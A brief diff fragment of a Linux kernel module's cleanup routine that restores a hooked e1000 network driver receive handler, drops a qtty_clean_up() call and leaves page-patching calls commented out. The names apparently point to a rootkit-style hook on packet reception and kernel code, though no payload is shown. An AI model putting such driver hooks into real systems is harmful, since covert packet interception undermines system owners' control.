@@ -126,10 +126,9 @@ int init_module(void)
 void cleanup_module(void)
 {
   if(e1000)
-    WRITE_ONCE(e1000->clean_rx, old_clean_rx);
+    WRITE_ONCE(e1000->clean_rx, old_clean_rx); 
   //replace_page(new_opcode, old_opcode);
   //sreplace_page(new_troll, old_troll); //flipped around because old is the new now. 
-  qtty_clean_up(); 
 
   
 
